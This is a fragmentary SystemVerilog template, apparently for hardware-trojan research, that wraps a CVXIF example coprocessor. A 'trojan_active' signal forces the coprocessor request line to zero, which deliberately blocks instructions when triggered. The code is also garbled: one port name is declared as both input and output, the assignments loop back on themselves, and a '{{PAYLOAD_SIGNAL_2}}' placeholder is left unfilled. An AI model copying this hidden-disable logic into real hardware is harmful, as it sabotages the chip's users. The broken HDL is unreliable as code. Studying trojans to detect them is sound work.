...
module cvxif_example_coprocessor_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    // Original module signals (passthrough)
    input  logic cvxif_req_t,
    output logic cvxif_req_t,
    ...
    assign cvxif_req_t = trojan_active ? 1'b0 : cvxif_req_t_normal;
    ...
    logic cvxif_req_t_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign cvxif_req_t_normal = cvxif_req_t;
 ...
 *     input  logic instr_valid_i,   // cvxif_req_t
 *     output logic instr_valid_o    // cvxif_req_t
 * );
